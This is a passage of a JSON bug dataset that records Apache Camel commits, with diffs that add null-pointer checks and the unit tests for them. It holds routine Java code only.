        "repo": "camel",
        "unit_tests": [
            "FileBeginFailureOneTimeTest.java",
            "DefaultExecutorServiceManagerTest.java"
        ]
    },
    "camel_5528d3c": {
        "bug_id": "camel_5528d3c",
        "commit": "https://github.com/apache/camel/commit/5528d3c1568a7d3da30866c4d0f23b0c72c22303",
        "file": [
            {
                "additions": 15,
                "blob_url": "https://github.com/apache/camel/blob/5528d3c1568a7d3da30866c4d0f23b0c72c22303/components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsBindingTest.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsBindingTest.java?ref=5528d3c1568a7d3da30866c4d0f23b0c72c22303",
                "deletions": 0,
                "filename": "components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsBindingTest.java",
                "patch": "@@ -22,6 +22,9 @@\n import java.util.Date;\n \n import org.apache.activemq.command.ActiveMQBlobMessage;\n+import org.apache.activemq.command.ActiveMQTextMessage;\n+import org.apache.camel.impl.DefaultCamelContext;\n+import org.apache.camel.impl.DefaultExchange;\n import org.junit.Before;\n import org.junit.Test;\n import org.junit.runner.RunWith;\n@@ -53,6 +56,18 @@ public void setup() {\n         jmsBindingUnderTest = new JmsBinding(mockJmsEndpoint);\n     }\n \n+    @Test\n+    public void noEndpointTest() throws Exception {\n+        JmsBinding testBindingWithoutEndpoint = new JmsBinding();\n+        ActiveMQTextMessage message = new ActiveMQTextMessage();\n+        message.setText(\"test\");\n+        DefaultCamelContext camelContext = new DefaultCamelContext();\n+        DefaultExchange exchange = new DefaultExchange(camelContext);\n+        exchange.getIn().setBody(\"test\");\n+        exchange.getIn().setHeader(\"JMSCorrelationID\", null);\n+        testBindingWithoutEndpoint.appendJmsProperties(message, exchange);\n+    }\n+\n     @Test\n     public void testExtractNullBodyFromJmsShouldReturnNull() throws Exception {\n         assertNull(jmsBindingUnderTest.extractBodyFromJms(null, new ActiveMQBlobMessage()));",
                "raw_url": "https://github.com/apache/camel/raw/5528d3c1568a7d3da30866c4d0f23b0c72c22303/components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsBindingTest.java",
                "sha": "1c29e26b5907a77c0c1bace91bc5ec8bc3da1065",
                "status": "modified"
            }
        ],
        "message": "[CAMEL-14156] Avoid NPE with endpoint is null in JmsBinding (#3328)",
        "parent": "https://github.com/apache/camel/commit/bbc0b86e8ddfe84541df4ba0201b416323def5a6",
        "patched_files": [
            "JmsBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "JmsBindingTest.java"
        ]
    },
    "camel_56b815d": {
        "bug_id": "camel_56b815d",
        "commit": "https://github.com/apache/camel/commit/56b815dca6658808f65fadc37477e43f20f55a8f",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/56b815dca6658808f65fadc37477e43f20f55a8f/camel-core/src/main/java/org/apache/camel/model/InterceptFromDefinition.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/InterceptFromDefinition.java?ref=56b815dca6658808f65fadc37477e43f20f55a8f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/model/InterceptFromDefinition.java",
                "patch": "@@ -74,7 +74,11 @@ public Processor createProcessor(RouteContext routeContext) throws Exception {\n         // this allows us to use the same header for both the interceptFrom and interceptSendToEndpoint\n         SetHeaderDefinition headerDefinition = new SetHeaderDefinition(Exchange.INTERCEPTED_ENDPOINT, new ExpressionAdapter() {\n             public Object evaluate(Exchange exchange, Class type) {\n-                return exchange.getFromEndpoint().getEndpointUri();\n+                if (exchange.getFromEndpoint() != null) {\n+                    return exchange.getFromEndpoint().getEndpointUri();\n+                } else {\n+                    return null;\n+                }\n             }\n \n             public String toString() {",
                "raw_url": "https://github.com/apache/camel/raw/56b815dca6658808f65fadc37477e43f20f55a8f/camel-core/src/main/java/org/apache/camel/model/InterceptFromDefinition.java",
                "sha": "c73f2694c645a6bccc37b7773f64ea30433ad35c",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/56b815dca6658808f65fadc37477e43f20f55a8f/camel-core/src/main/java/org/apache/camel/model/RouteDefinition.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/RouteDefinition.java?ref=56b815dca6658808f65fadc37477e43f20f55a8f",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/model/RouteDefinition.java",
                "patch": "@@ -203,6 +203,10 @@ public RouteDefinition adviceWith(CamelContext camelContext, RouteBuilder builde\n             throw new IllegalArgumentException(\"You can only advice from a RouteBuilder which has no existing routes.\"\n                     + \" Remove all routes from the route builder.\");\n         }\n+        // we can not advice with error handlers\n+        if (routes.getErrorHandlerBuilder() != null) {\n+            throw new IllegalArgumentException(\"You can not advice with error handlers. Remove the error handlers from the route builder.\");\n+        }\n \n         // stop and remove this existing route\n         camelContext.removeRouteDefinition(this);",
                "raw_url": "https://github.com/apache/camel/raw/56b815dca6658808f65fadc37477e43f20f55a8f/camel-core/src/main/java/org/apache/camel/model/RouteDefinition.java",
                "sha": "ecb7d1f6481fd70bb8bbf4ba827744aeddaa6c7f",
                "status": "modified"
            },
            {
                "additions": 157,
                "blob_url": "https://github.com/apache/camel/blob/56b815dca6658808f65fadc37477e43f20f55a8f/camel-core/src/test/java/org/apache/camel/issues/AdviceWithIssueTest.java",
                "changes": 157,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/issues/AdviceWithIssueTest.java?ref=56b815dca6658808f65fadc37477e43f20f55a8f",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/issues/AdviceWithIssueTest.java",
                "patch": "@@ -0,0 +1,157 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.issues;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Processor;\n+import org.apache.camel.builder.AdviceWithRouteBuilder;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.model.RouteDefinition;\n+\n+/**\n+ * @version $Revision$\n+ */\n+public class AdviceWithIssueTest extends ContextTestSupport {\n+\n+    public void testNoAdvice() throws Exception {\n+        getMockEndpoint(\"mock:result\").expectedBodiesReceived(\"Hello World\");\n+\n+        template.sendBody(\"direct:start\", \"World\");\n+        try {\n+            template.sendBody(\"direct:start\", \"Kaboom\");\n+            fail(\"Should have thrown exception\");\n+        } catch (Exception e) {\n+            // expected\n+        }\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    public void testAdviceWithErrorHandler() throws Exception {\n+        RouteDefinition route = context.getRouteDefinitions().get(0);\n+        try {\n+            route.adviceWith(context, new AdviceWithRouteBuilder() {\n+                @Override\n+                public void configure() throws Exception {\n+                    errorHandler(deadLetterChannel(\"mock:dead\"));\n+                }\n+            });\n+            fail(\"Should have thrown exception\");\n+        } catch (IllegalArgumentException e) {\n+            assertEquals(\"You can not advice with error handlers. Remove the error handlers from the route builder.\", e.getMessage());\n+        }\n+    }\n+\n+    public void testAdviceWithOnException() throws Exception {\n+        RouteDefinition route = context.getRouteDefinitions().get(0);\n+        route.adviceWith(context, new AdviceWithRouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                onException(IllegalArgumentException.class)\n+                        .handled(true)\n+                        .to(\"mock:error\");\n+            }\n+        });\n+\n+        getMockEndpoint(\"mock:result\").expectedBodiesReceived(\"Hello World\");\n+        getMockEndpoint(\"mock:error\").expectedBodiesReceived(\"Kaboom\");\n+\n+        template.sendBody(\"direct:start\", \"World\");\n+        template.sendBody(\"direct:start\", \"Kaboom\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    public void testAdviceWithInterceptFrom() throws Exception {\n+        RouteDefinition route = context.getRouteDefinitions().get(0);\n+        route.adviceWith(context, new AdviceWithRouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                interceptFrom().to(\"mock:from\");\n+            }\n+        });\n+\n+        getMockEndpoint(\"mock:result\").expectedBodiesReceived(\"Hello World\");\n+        getMockEndpoint(\"mock:from\").expectedBodiesReceived(\"World\");\n+        getMockEndpoint(\"mock:from\").expectedHeaderReceived(Exchange.INTERCEPTED_ENDPOINT, \"direct://start\");\n+\n+        template.sendBody(\"direct:start\", \"World\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    public void testAdviceWithInterceptSendToEndpoint() throws Exception {\n+        RouteDefinition route = context.getRouteDefinitions().get(0);\n+        route.adviceWith(context, new AdviceWithRouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                interceptSendToEndpoint(\"mock:result\").to(\"mock:to\");\n+            }\n+        });\n+\n+        getMockEndpoint(\"mock:result\").expectedBodiesReceived(\"Hello World\");\n+        getMockEndpoint(\"mock:to\").expectedBodiesReceived(\"Hello World\");\n+        getMockEndpoint(\"mock:to\").expectedHeaderReceived(Exchange.INTERCEPTED_ENDPOINT, \"mock://result\");\n+\n+        template.sendBody(\"direct:start\", \"World\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    public void testAdviceWithOnCompletion() throws Exception {\n+        RouteDefinition route = context.getRouteDefinitions().get(0);\n+        route.adviceWith(context, new AdviceWithRouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                onCompletion().to(\"mock:done\");\n+            }\n+        });\n+\n+        getMockEndpoint(\"mock:result\").expectedBodiesReceived(\"Hello World\");\n+        getMockEndpoint(\"mock:done\").expectedBodiesReceived(\"Hello World\");\n+\n+        template.sendBody(\"direct:start\", \"World\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:start\")\n+                    .process(new MyProcessor())\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+\n+    private final class MyProcessor implements Processor {\n+\n+        @Override\n+        public void process(Exchange exchange) throws Exception {\n+            String body = exchange.getIn().getBody(String.class);\n+            if (\"Kaboom\".equals(body)) {\n+                throw new IllegalArgumentException(\"Kaboom\");\n+            }\n+            exchange.getIn().setBody(\"Hello \" + body);\n+        }\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/56b815dca6658808f65fadc37477e43f20f55a8f/camel-core/src/test/java/org/apache/camel/issues/AdviceWithIssueTest.java",
                "sha": "8c52f52eaa300fc4d2c519af827c952c053d2731",
                "status": "added"
            }
        ],
        "message": "CAMEL-3665: AdviceWith will now fail if using error handler, as its not supported. Fixed potential NPE in intercept from.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1070507 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/b7a199587c3a3f5a15a0687a18d36f9313c058e5",
        "patched_files": [
            "RouteDefinition.java",
            "InterceptFromDefinition.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "AdviceWithIssueTest.java"
        ]
    },
    "camel_574091d": {
        "bug_id": "camel_574091d",
        "commit": "https://github.com/apache/camel/commit/574091dd92957bad5bd93a9d9e19257ee047f22e",
        "file": [
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/574091dd92957bad5bd93a9d9e19257ee047f22e/components/camel-salesforce/camel-salesforce-component/src/main/java/org/apache/camel/component/salesforce/internal/client/AbstractClientBase.java",
                "changes": 14,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-salesforce/camel-salesforce-component/src/main/java/org/apache/camel/component/salesforce/internal/client/AbstractClientBase.java?ref=574091dd92957bad5bd93a9d9e19257ee047f22e",
                "deletions": 6,
                "filename": "components/camel-salesforce/camel-salesforce-component/src/main/java/org/apache/camel/component/salesforce/internal/client/AbstractClientBase.java",
                "patch": "@@ -103,12 +103,14 @@ public void start() throws Exception {\n \n     @Override\n     public void stop() throws Exception {\n-        inflightRequests.arrive();\n-        if (!inflightRequests.isTerminated()) {\n-            try {\n-                inflightRequests.awaitAdvanceInterruptibly(0, terminationTimeout, TimeUnit.SECONDS);\n-            } catch (InterruptedException | TimeoutException ignored) {\n-                // exception is ignored\n+        if (inflightRequests != null) {\n+            inflightRequests.arrive();\n+            if (!inflightRequests.isTerminated()) {\n+                try {\n+                    inflightRequests.awaitAdvanceInterruptibly(0, terminationTimeout, TimeUnit.SECONDS);\n+                } catch (InterruptedException | TimeoutException ignored) {\n+                    // exception is ignored\n+                }\n             }\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/574091dd92957bad5bd93a9d9e19257ee047f22e/components/camel-salesforce/camel-salesforce-component/src/main/java/org/apache/camel/component/salesforce/internal/client/AbstractClientBase.java",
                "sha": "e996de553d4d1ee5d8b477b83f459f94326a0a2a",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11386 Potential NullPointerException if H...\n\n...TTP client not started and stop was performed\n\nThis adds `null` check of `inflightRequests` to the `stop` method.",
        "parent": "https://github.com/apache/camel/commit/2e1a114910d91940cfad41ea83eb588d68bb287a",
        "patched_files": [
            "AbstractClientBase.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "AbstractClientBaseTest.java"
        ]
    },
    "camel_57aac0f": {
        "bug_id": "camel_57aac0f",
        "commit": "https://github.com/apache/camel/commit/57aac0f5fd82c8ec6cf522943c6c3a653143688c",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/57aac0f5fd82c8ec6cf522943c6c3a653143688c/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java?ref=57aac0f5fd82c8ec6cf522943c6c3a653143688c",
                "deletions": 0,
                "filename": "components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java",
                "patch": "@@ -338,6 +338,9 @@ protected void setWebSocketComponentServletInitialParameter(ServletContextHandle\n \n     protected Server createServer() throws Exception {\n         Server server = null;\n+        if (minThreads == null && maxThreads == null && getThreadPool() == null) {\n+            throw new RuntimeCamelException(\"Error creating JettyWebSocketServer. MinThreads/MaxThreads or ThreadPool must be defined\");        \t\n+        }\n         // configure thread pool if min/max given\n         if (minThreads != null || maxThreads != null) {\n             if (getThreadPool() != null) {",
                "raw_url": "https://github.com/apache/camel/raw/57aac0f5fd82c8ec6cf522943c6c3a653143688c/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java",
                "sha": "d7210205fc900f385f990e614d140fff6bbe16b1",
                "status": "modified"
            },
            {
                "additions": 44,
                "blob_url": "https://github.com/apache/camel/blob/57aac0f5fd82c8ec6cf522943c6c3a653143688c/components/camel-websocket/src/test/java/org/apache/camel/component/websocket/WebsocketEndpointConfigurationTest.java",
                "changes": 45,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-websocket/src/test/java/org/apache/camel/component/websocket/WebsocketEndpointConfigurationTest.java?ref=57aac0f5fd82c8ec6cf522943c6c3a653143688c",
                "deletions": 1,
                "filename": "components/camel-websocket/src/test/java/org/apache/camel/component/websocket/WebsocketEndpointConfigurationTest.java",
                "patch": "@@ -22,10 +22,11 @@\n import org.apache.camel.test.AvailablePortFinder;\n import org.apache.camel.test.junit4.CamelTestSupport;\n import org.eclipse.jetty.servlet.ServletContextHandler;\n+import org.eclipse.jetty.util.thread.QueuedThreadPool;\n import org.junit.Test;\n import org.mockito.Mock;\n \n-public class WebscoketEndpointConfigurationTest extends CamelTestSupport {\n+public class WebsocketEndpointConfigurationTest extends CamelTestSupport {\n     \n     private int port;\n     \n@@ -60,5 +61,47 @@ public void testSetServletInitalparameters() throws Exception {\n         String maxIdleTime = context.getInitParameter(\"maxIdleTime\");\n         assertEquals(\"Get a worng maxIdleTime\", \"3000\", maxIdleTime);\n     }\n+    \n+    @Test(expected=RuntimeException.class)\n+    public void testSetServletNoMinThreadsNoMaxThreadsNoThreadPool() throws Exception {\n+        String uri = \"websocket://localhost:\" + port + \"/bar?bufferSize=65000&maxIdleTime=3000\";\n+        WebsocketEndpoint websocketEndpoint = (WebsocketEndpoint)context.getEndpoint(uri);\n+        WebsocketComponent component = websocketEndpoint.getComponent();\n+        Consumer consumer = websocketEndpoint.createConsumer(processor);\n+        component.connect((WebsocketProducerConsumer) consumer);\n+        assertNotNull(consumer);\n+        assertEquals(WebsocketConsumer.class, consumer.getClass());\n+        \n+        // just check the servlet initial parameters\n+        ConnectorRef conector = WebsocketComponent.getConnectors().values().iterator().next();\n+        \n+        ServletContextHandler context = (ServletContextHandler)conector.server.getHandler();\n+        String buffersize = context.getInitParameter(\"bufferSize\");\n+        assertEquals(\"Get a wrong buffersize\", \"65000\", buffersize);\n+        String maxIdleTime = context.getInitParameter(\"maxIdleTime\");\n+        assertEquals(\"Get a worng maxIdleTime\", \"3000\", maxIdleTime);\n+    }\n+    \n+    @Test\n+    public void testSetServletThreadPool() throws Exception {\n+        String uri = \"websocket://localhost:\" + port + \"/bar?bufferSize=65000&maxIdleTime=3000\";\n+        WebsocketEndpoint websocketEndpoint = (WebsocketEndpoint)context.getEndpoint(uri);\n+        WebsocketComponent component = websocketEndpoint.getComponent();\n+        QueuedThreadPool qtp = new QueuedThreadPool(20, 1);\n+        component.setThreadPool(qtp);\n+        Consumer consumer = websocketEndpoint.createConsumer(processor);\n+        component.connect((WebsocketProducerConsumer) consumer);\n+        assertNotNull(consumer);\n+        assertEquals(WebsocketConsumer.class, consumer.getClass());\n+        \n+        // just check the servlet initial parameters\n+        ConnectorRef conector = WebsocketComponent.getConnectors().values().iterator().next();\n+        \n+        ServletContextHandler context = (ServletContextHandler)conector.server.getHandler();\n+        String buffersize = context.getInitParameter(\"bufferSize\");\n+        assertEquals(\"Get a wrong buffersize\", \"65000\", buffersize);\n+        String maxIdleTime = context.getInitParameter(\"maxIdleTime\");\n+        assertEquals(\"Get a worng maxIdleTime\", \"3000\", maxIdleTime);\n+    }\n \n }",
                "previous_filename": "components/camel-websocket/src/test/java/org/apache/camel/component/websocket/WebscoketEndpointConfigurationTest.java",
                "raw_url": "https://github.com/apache/camel/raw/57aac0f5fd82c8ec6cf522943c6c3a653143688c/components/camel-websocket/src/test/java/org/apache/camel/component/websocket/WebsocketEndpointConfigurationTest.java",
                "sha": "5e8a59b770348cdf42faea252def5115934c36e4",
                "status": "renamed"
            }
        ],
        "message": "CAMEL-9950: Camel-Websocket: NPE in case minThreads, maxThreads and getThreadPool equals to null",
        "parent": "https://github.com/apache/camel/commit/426922a2607420ba0175da27145d520e80120291",
        "patched_files": [
            "WebsocketComponent.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "WebsocketEndpointConfigurationTest.java",
            "WebsocketComponentTest.java"
        ]
    },
    "camel_57f72cd": {
        "bug_id": "camel_57f72cd",
        "commit": "https://github.com/apache/camel/commit/57f72cd95435f83962443b2f8dc2f5aa2018f225",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/57f72cd95435f83962443b2f8dc2f5aa2018f225/camel-core/src/main/java/org/apache/camel/processor/aggregate/AbstractListAggregationStrategy.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/aggregate/AbstractListAggregationStrategy.java?ref=57f72cd95435f83962443b2f8dc2f5aa2018f225",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/aggregate/AbstractListAggregationStrategy.java",
                "patch": "@@ -62,7 +62,7 @@ public boolean isStoreAsBodyOnCompletion() {\n \n     @SuppressWarnings(\"unchecked\")\n     public void onCompletion(Exchange exchange) {\n-        if (isStoreAsBodyOnCompletion()) {\n+        if (exchange != null && isStoreAsBodyOnCompletion()) {\n             List<V> list = (List<V>) exchange.removeProperty(Exchange.GROUPED_EXCHANGE);\n             if (list != null) {\n                 exchange.getIn().setBody(list);",
                "raw_url": "https://github.com/apache/camel/raw/57f72cd95435f83962443b2f8dc2f5aa2018f225/camel-core/src/main/java/org/apache/camel/processor/aggregate/AbstractListAggregationStrategy.java",
                "sha": "d4ff93f1aeb17fc2b382197e4a4797dc04e55b01",
                "status": "modified"
            },
            {
                "additions": 81,
                "blob_url": "https://github.com/apache/camel/blob/57f72cd95435f83962443b2f8dc2f5aa2018f225/camel-core/src/test/java/org/apache/camel/processor/aggregator/CustomListAggregationStrategyEmptySplitTest.java",
                "changes": 81,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/aggregator/CustomListAggregationStrategyEmptySplitTest.java?ref=57f72cd95435f83962443b2f8dc2f5aa2018f225",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/aggregator/CustomListAggregationStrategyEmptySplitTest.java",
                "patch": "@@ -0,0 +1,81 @@\n+/**\r\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\r\n+ * contributor license agreements.  See the NOTICE file distributed with\r\n+ * this work for additional information regarding copyright ownership.\r\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\r\n+ * (the \"License\"); you may not use this file except in compliance with\r\n+ * the License.  You may obtain a copy of the License at\r\n+ *\r\n+ *      http://www.apache.org/licenses/LICENSE-2.0\r\n+ *\r\n+ * Unless required by applicable law or agreed to in writing, software\r\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\r\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n+ * See the License for the specific language governing permissions and\r\n+ * limitations under the License.\r\n+ */\r\n+package org.apache.camel.processor.aggregator;\r\n+\r\n+import java.util.ArrayList;\r\n+import java.util.List;\r\n+\r\n+import org.apache.camel.ContextTestSupport;\r\n+import org.apache.camel.Exchange;\r\n+import org.apache.camel.builder.RouteBuilder;\r\n+import org.apache.camel.component.mock.MockEndpoint;\r\n+import org.apache.camel.processor.aggregate.AbstractListAggregationStrategy;\r\n+\r\n+/**\r\n+ *\r\n+ */\r\n+public class CustomListAggregationStrategyEmptySplitTest extends\r\n+        ContextTestSupport {\r\n+\r\n+    @SuppressWarnings(\"unchecked\")\r\n+    public void testCustomAggregationStrategy() throws Exception {\r\n+        getMockEndpoint(\"mock:line\").expectedBodiesReceived();\r\n+\r\n+        MockEndpoint result = getMockEndpoint(\"mock:result\");\r\n+        result.expectedMessageCount(1);\r\n+        result.message(0).body().isInstanceOf(List.class);\r\n+\r\n+        List<String> body = new ArrayList<String>();\r\n+\r\n+        template.sendBody(\"direct:start\", body);\r\n+\r\n+        assertMockEndpointsSatisfied();\r\n+\r\n+        // the list will be stored as the message body by default\r\n+        List<Integer> numbers = result.getExchanges().get(0).getIn()\r\n+                .getBody(List.class);\r\n+        assertNotNull(numbers);\r\n+        assertEquals(0, numbers.size());\r\n+    }\r\n+\r\n+    @Override\r\n+    protected RouteBuilder createRouteBuilder() throws Exception {\r\n+        return new RouteBuilder() {\r\n+            @Override\r\n+            public void configure() throws Exception {\r\n+                from(\"direct:start\")\r\n+                        .split(body(), new MyListOfNumbersStrategy())\r\n+                        .to(\"mock:line\").end().to(\"mock:result\");\r\n+            }\r\n+        };\r\n+    }\r\n+\r\n+    /**\r\n+     * Our strategy is irrelevant as getValue will not be called on an empty\r\n+     * list, however this strategy will group a list of integers.\r\n+     */\r\n+    public final class MyListOfNumbersStrategy extends\r\n+            AbstractListAggregationStrategy<Integer> {\r\n+\r\n+        @Override\r\n+        public Integer getValue(Exchange exchange) {\r\n+            String s = exchange.getIn().getBody(String.class);\r\n+            return Integer.valueOf(s);\r\n+        }\r\n+    }\r\n+\r\n+}\r",
                "raw_url": "https://github.com/apache/camel/raw/57f72cd95435f83962443b2f8dc2f5aa2018f225/camel-core/src/test/java/org/apache/camel/processor/aggregator/CustomListAggregationStrategyEmptySplitTest.java",
                "sha": "2bf45efd3ce8cb5fe10049b931505611cc17f778",
                "status": "added"
            }
        ],
        "message": "CAMEL-8592 Fixed the NPE in AbstractListAggregationStrategy if empty list",
        "parent": "https://github.com/apache/camel/commit/7b4c712a9de43737932f46e921358538401b7b8a",
        "patched_files": [
            "AbstractListAggregationStrategy.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CustomListAggregationStrategyEmptySplitTest.java"
        ]
    },
    "camel_5827b3d": {
        "bug_id": "camel_5827b3d",
        "commit": "https://github.com/apache/camel/commit/5827b3d503cfc5763470be5290346e345aff26f0",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/5827b3d503cfc5763470be5290346e345aff26f0/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=5827b3d503cfc5763470be5290346e345aff26f0",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -1659,7 +1659,7 @@ public void setupRoutes(boolean done) {\n \n     public synchronized RouteDefinition getRouteDefinition(String id) {\n         for (RouteDefinition route : routeDefinitions) {\n-            if (route.getId() != null && route.getId().equals(id)) {\n+            if (route.idOrCreate(nodeIdFactory).equals(id)) {\n                 return route;\n             }\n         }",
                "raw_url": "https://github.com/apache/camel/raw/5827b3d503cfc5763470be5290346e345aff26f0/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "a12f08847665fae04f205a6c51ae612d2284da6e",
                "status": "modified"
            }
        ],
        "message": "CAMEL-8077: Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/4650af58464b2db9c6b0756ca0a22dde0a0e40ae",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java"
        ]
    },
    "camel_597883f": {
        "bug_id": "camel_597883f",
        "commit": "https://github.com/apache/camel/commit/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7",
        "file": [
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "changes": 26,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java?ref=597883fa57fbd1b4dcc282e9493b5ebfade4b5a7",
                "deletions": 12,
                "filename": "camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "patch": "@@ -759,20 +759,22 @@ private MethodInfo chooseBestPossibleMethodInfo(Exchange exchange, Collection<Me\n             MethodInfo matched = null;\n             int matchCounter = 0;\n             for (MethodInfo methodInfo : operationList) {\n-                if (methodInfo.getBodyParameterType().isInstance(body)) {\n-                    return methodInfo;\n-                }\n+                if (methodInfo.getBodyParameterType() != null) {\n+                    if (methodInfo.getBodyParameterType().isInstance(body)) {\n+                        return methodInfo;\n+                    }\n \n-                // we should only try to convert, as we are looking for best match\n-                Object value = exchange.getContext().getTypeConverter().tryConvertTo(methodInfo.getBodyParameterType(), exchange, body);\n-                if (value != null) {\n-                    if (LOG.isTraceEnabled()) {\n-                        LOG.trace(\"Converted body from: {} to: {}\",\n-                                body.getClass().getCanonicalName(), methodInfo.getBodyParameterType().getCanonicalName());\n+                    // we should only try to convert, as we are looking for best match\n+                    Object value = exchange.getContext().getTypeConverter().tryConvertTo(methodInfo.getBodyParameterType(), exchange, body);\n+                    if (value != null) {\n+                        if (LOG.isTraceEnabled()) {\n+                            LOG.trace(\"Converted body from: {} to: {}\",\n+                                    body.getClass().getCanonicalName(), methodInfo.getBodyParameterType().getCanonicalName());\n+                        }\n+                        matchCounter++;\n+                        newBody = value;\n+                        matched = methodInfo;\n                     }\n-                    matchCounter++;\n-                    newBody = value;\n-                    matched = methodInfo;\n                 }\n             }\n             if (matchCounter > 1) {",
                "raw_url": "https://github.com/apache/camel/raw/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "sha": "67a08932e557d031140361b10e83952945778fc8",
                "status": "modified"
            },
            {
                "additions": 25,
                "blob_url": "https://github.com/apache/camel/blob/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/test/java/org/apache/camel/component/bean/issues/AbstractTransformer.java",
                "changes": 25,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/bean/issues/AbstractTransformer.java?ref=597883fa57fbd1b4dcc282e9493b5ebfade4b5a7",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/bean/issues/AbstractTransformer.java",
